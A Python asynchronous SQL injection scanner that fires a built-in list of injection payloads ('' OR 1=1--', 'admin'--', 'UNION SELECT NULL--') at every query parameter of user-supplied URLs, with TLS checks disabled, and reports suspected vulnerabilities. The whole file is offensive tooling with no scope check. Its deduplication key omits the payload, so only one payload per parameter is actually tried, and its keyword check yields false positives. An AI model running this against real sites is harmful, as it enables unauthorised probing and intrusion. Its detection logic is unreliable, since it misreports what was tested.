#!/usr/bin/env python3
import asyncio
import aiohttp
import argparse
import json
from urllib.parse import urlparse, parse_qs, urlencode
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
from rich.console import Console
from typing import List, Dict, Set, Optional
import time

console = Console()

# Optimized minimal but effective payload set
DEFAULT_PAYLOADS = {
    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", 
    "' OR 1=1--", "\" OR 1=1--", "admin'--",
    "' UNION SELECT NULL--", "1' ORDER BY 1--"
}

class SQLInjectionTester:
    def __init__(self, concurrency: int = 30, timeout: int = 5):
        self.concurrency = concurrency
        self.timeout = timeout
        self.session: Optional[aiohttp.ClientSession] = None
        self.tested_params: Set[str] = set()
        self.rate_limit = asyncio.Semaphore(50)
        
    async def init_session(self):
        if not self.session:
            timeout = aiohttp.ClientTimeout(total=self.timeout)
            connector = aiohttp.TCPConnector(limit=self.concurrency, ttl_dns_cache=300)
            self.session = aiohttp.ClientSession(timeout=timeout, connector=connector)

    async def close_session(self):
        if self.session:
            await self.session.close()
            self.session = None

    def extract_params(self, url: str) -> Dict[str, str]:
        parsed = urlparse(url)
        return {k: v[0] for k, v in parse_qs(parsed.query).items()}

    def create_payload_url(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return parsed._replace(query=new_query).geturl()

    async def test_payload(self, url: str, param: str, payload: str) -> Optional[Dict]:
        async with self.rate_limit:
            try:
                test_url = self.create_payload_url(url, param, payload)
                param_key = f"{url}:{param}"
                
                if param_key in self.tested_params:
                    return None
                
                self.tested_params.add(param_key)
                
                async with self.session.get(test_url, ssl=False, allow_redirects=False) as response:
                    if response.status >= 500:  # Quick check for server errors
                        return {
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'type': 'error',
                            'evidence': f'Server Error: {response.status}'
                        }
                    
                    # Only read response text if status code indicates potential vulnerability
                    if response.status != 200:
                        return None
                        
                    text = await response.text()
                    text_lower = text.lower()
                    
                    # Fast vulnerability checks
                    if any(indicator in text_lower for indicator in ('sql', 'mysql', 'oracle', 'syntax', 'error')):
                        return {
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'type': 'sql',
                            'evidence': text[:100]  # Reduced evidence size
                        }
                            
            except (asyncio.TimeoutError, aiohttp.ClientError):
                return None
            except Exception:
                return None
        return None

    async def test_url(self, url: str, progress, task_id):
        params = self.extract_params(url)
        if not params:
            return []

        tasks = []
        for param in params:
            for payload in DEFAULT_PAYLOADS:
                tasks.append(self.test_payload(url, param, payload))
                progress.update(task_id, advance=1)
                
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return [r for r in results if r and isinstance(r, dict)]

    async def run(self, urls: List[str], output_file: Optional[str] = None):
        await self.init_session()
        
        try:
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TaskProgressColumn(),
                console=console
            ) as progress:
                total_tasks = len(urls) * len(DEFAULT_PAYLOADS)
                task_id = progress.add_task("Testing parameters...", total=total_tasks)
                
                tasks = [self.test_url(url, progress, task_id) for url in urls]
                results = await asyncio.gather(*tasks)
                
                vulnerabilities = [v for sublist in results for v in sublist if v]
                
                if vulnerabilities:
                    console.print("\n[bold green]Vulnerabilities found![/bold green]\n")
                    for vuln in vulnerabilities:
                        console.print(f"Parameter: {vuln['parameter']}")
                        console.print(f"Payload: {vuln['payload']}")
                        console.print(f"URL: {vuln['url']}")
                        console.print(f"Evidence: {vuln['evidence']}\n")
                        
                    if output_file:
                        with open(output_file, 'w') as f:
                            json.dump(vulnerabilities, f, indent=2)
                else:
                    console.print("\n[bold yellow]No vulnerabilities found.[/bold yellow]")
                    
        finally:
            await self.close_session()

def main():
    parser = argparse.ArgumentParser(description='Fast SQL Injection Tester')
    parser.add_argument('-u', '--url', help='Single URL to test')
    parser.add_argument('-f', '--file', help='File containing URLs to test')
    parser.add_argument('-t', '--threads', type=int, default=30, help='Number of concurrent threads')
    parser.add_argument('-o', '--output', help='Output JSON file for results')
    args = parser.parse_args()

    if not args.url and not args.file:
        parser.error('Either --url or --file is required')

    urls = []
    if args.url:
        urls.append(args.url)
    if args.file:
        with open(args.file) as f:
            urls.extend(line.strip() for line in f if line.strip())

    tester = SQLInjectionTester(concurrency=args.threads)
    asyncio.run(tester.run(urls, args.output))

if __name__ == '__main__':
    main()
